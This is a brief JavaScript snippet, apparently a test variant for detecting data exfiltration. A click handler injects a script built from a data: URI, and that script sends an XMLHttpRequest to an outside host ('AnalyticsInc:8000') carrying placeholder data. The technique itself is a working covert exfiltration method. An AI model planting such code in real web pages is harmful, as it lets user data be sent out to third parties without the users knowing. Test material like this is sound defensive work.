function exfiltrate_key_history() {

    // Data URI - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var data = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=data1", true);xmlhttp.send(null);';
    var URL = 'data:text/javascript;,' + encodeURIComponent(data);
    var script = document.createElement("script");
    script.src = URL;
	document.getElementsByTagName('head')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
